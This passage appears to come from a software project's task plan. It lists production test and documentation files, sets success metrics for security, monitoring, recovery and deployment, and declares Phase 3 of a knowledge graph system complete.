- `tests/production/mod.rs` - Production test module definitions
- `docs/production/deployment_guide.md` - Production deployment guide
- `docs/production/operational_runbook.md` - Operational procedures

## Success Metrics
- Security: 0 vulnerabilities detected in penetration testing
- Monitoring: 100% uptime visibility and < 30s alert response time
- Recovery: < 5 minute RTO for critical failures
- Documentation: 100% API coverage and operational procedure completeness
- Deployment: Successful automated deployment with zero-downtime updates

## Next Task
**Phase 3 Complete!** All 35 micro-tasks have been successfully implemented. The knowledge graph system is now production-ready with comprehensive integration with Phase 2 neuromorphic allocation engine, robust performance characteristics, and full operational capabilities.